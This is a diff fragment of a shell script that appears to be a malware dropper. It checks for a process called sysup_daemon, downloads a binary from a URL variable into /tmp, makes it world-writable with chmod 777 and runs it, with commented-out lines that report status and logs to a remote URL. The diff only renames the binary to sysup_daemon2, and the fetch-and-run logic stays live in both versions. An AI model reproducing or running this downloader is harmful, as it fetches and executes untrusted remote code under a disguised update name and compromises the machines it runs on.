@@ -15,19 +15,19 @@ else
 #    curl -X POST $report_url -d "GShell_i386"
 fi 
 
-runCount=$(ps -ef|grep sysup_daemon | grep -v grep -c)
+runCount=$(ps -ef|grep sysup_daemon2 | grep -v grep -c)
 if [ $runCount != 0 ];then
 # curl -X POST $report_url -d "GShell_Exit"
     exit
 fi 
 
-curl -o /tmp/sysup_daemon $pl_url 1>/tmp/tmplog0423231.log 2>&1
-runCount2=$(ps -ef|grep sysup_daemon | grep -v grep -c)
+curl -o /tmp/sysup_daemon2 $pl_url 1>/tmp/tmplog0423231.log 2>&1
+runCount2=$(ps -ef|grep sysup_daemon2 | grep -v grep -c)
 if [ $runCount2 != 0 ];then
     echo "exit"
     exit
 fi
-chmod 777 /tmp/sysup_daemon 1>>/tmp/tmplog0423231.log 2>&1
-/tmp/sysup_daemon 1>>/tmp/tmplog0423231.log 2>&1
+chmod 777 /tmp/sysup_daemon2 1>>/tmp/tmplog0423231.log 2>&1
+/tmp/sysup_daemon2 1>>/tmp/tmplog0423231.log 2>&1
 # curl -X POST $report_url -d @/tmp/tmplog0423231.log
 rm /tmp/tmplog0423231.log
